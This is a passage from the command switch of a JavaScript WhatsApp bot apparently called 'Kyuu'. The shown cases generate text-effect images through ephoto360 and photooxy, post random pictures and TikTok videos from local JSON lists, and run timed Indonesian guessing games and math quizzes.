case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcxeon(`Example : ${prefix+command} Kyuu`) 
replygcxeon(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
Kyuu.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcxeon(`Example : ${prefix+command} Kyuu`) 
replygcxeon(mess.wait)
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
Kyuu.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'tiktokgirl':
replygcxeon(mess.wait)
var asupan = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
Kyuu.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
replygcxeon(mess.wait)
var gheayubi = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
Kyuu.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
replygcxeon(mess.wait)
var bocil = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
Kyuu.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
replygcxeon(mess.wait)
var ukhty = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
Kyuu.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
replygcxeon(mess.wait)
var santuy = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
Kyuu.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
replygcxeon(mess.wait)
var kayes = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
Kyuu.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
replygcxeon(mess.wait)
var rikagusriani = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
Kyuu.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
            case 'kuismath':
            case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                let {
                    genMath,
                    modes
                } = require('./database/math')
                if (!text) return reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                Kyuu.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'tebak': {
                if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Kyuu.sendMessage(m.chat, {
                        image: {
                            url: result.img
                        },
                        caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`
                    }, {
                        quoted: m
                    }).then(() => {
                        tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        Kyuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}`, m)
                        delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Kyuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        Kyuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}`, m)
                        delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Kyuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        Kyuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}`, m)
                        delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Kyuu.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                        tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        Kyuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}`, m)
                        delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'tebakan') {
                    if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Kyuu.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                        tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        Kyuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktebakan[m.sender.split('@')[0]]}`, m)
                        delete tebaktebakan[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'bendera') {
                    if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Kyuu.sendMessage(m.chat, {
                        image: {
                            url: result.img
                        },
                        caption: `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`
                    }, {
                        quoted: m
                    }).then(() => {
                        tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.name)
                        Kyuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
                        delete tebakbendera[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'bendera2') {
                    if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Kyuu.sendMessage(m.chat, {
                        image: {
                            url: result.img
                        },
                        caption: `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`
                    }, {
                        quoted: m
                    }).then(() => {
                        tebakbendera2[m.sender.split('@')[0]] = result.name.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.name)
                        Kyuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera2[m.sender.split('@')[0]]}`, m)
                        delete tebakbendera2[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kabupaten') {
                    if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Kyuu.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
                        tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.title)
                        Kyuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkabupaten[m.sender.split('@')[0]]}`, m)
                        delete tebakkabupaten[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kimia') {
                    if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Kyuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nUnsur : ${result.unsur}\nWaktu : 60s`, m).then(() => {
                        tebakkimia[m.sender.split('@')[0]] = result.lambang.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.lambang)
                        Kyuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkimia[m.sender.split('@')[0]]}`, m)
                        delete tebakkimia[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'asahotak') {
                    if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Kyuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebakasahotak[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        Kyuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakasahotak[m.sender.split('@')[0]]}`, m)
                        delete tebakasahotak[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'siapakahaku') {
                    if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Kyuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebaksiapakahaku[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        Kyuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksiapakahaku[m.sender.split('@')[0]]}`, m)
                        delete tebaksiapakahaku[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'susunkata') {
                    if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Kyuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : 60s`, m).then(() => {
                        tebaksusunkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        Kyuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksusunkata[m.sender.split('@')[0]]}`, m)
                        delete tebaksusunkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'tekateki') {
                    if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Kyuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebaktekateki[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
